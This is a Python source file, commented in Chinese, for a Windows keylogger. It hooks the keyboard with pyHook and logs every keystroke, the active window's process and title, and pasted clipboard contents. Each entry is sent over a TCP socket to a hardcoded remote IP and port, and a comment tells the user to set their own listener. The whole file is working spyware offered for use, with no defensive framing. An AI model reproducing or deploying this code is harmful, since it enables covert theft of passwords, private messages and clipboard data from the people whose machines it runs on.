# encoding:utf8
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import sys
import socket
from os import path

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def send_msg(msg):
        ip = "47.74.134.85"          #远程监听ip，自己设置
        port = 7788            #远程监听端口
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ip, port))
            client.sendall(msg)
            client.close()
        except Exception as e:
            pass


def get_current_process():

    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)

    log_p = "\n\n<-----[ PID:%s-%s-%s]----->" % (process_id,executable.value,windows_title.value)

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

    return log_p

# 定义击键监听事件函数
def KeyStroke(event):

    global current_window

    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
        send_msg(get_current_process())

    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        if event.Ascii == 96:
            exit(1)
        else:
            send_msg(chr(event.Ascii))

    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            log_p = "[PASTE]-%s" % (pasted_value)
        else:
            log_p = "[%s]" % event.Key
        #print log_p,
        send_msg(log_p)


    # 循环监听下一个击键事件
    return True


def key_main():
    # 创建并注册hook管理器
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

    # 注册hook并执行
    kl.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    key_main()
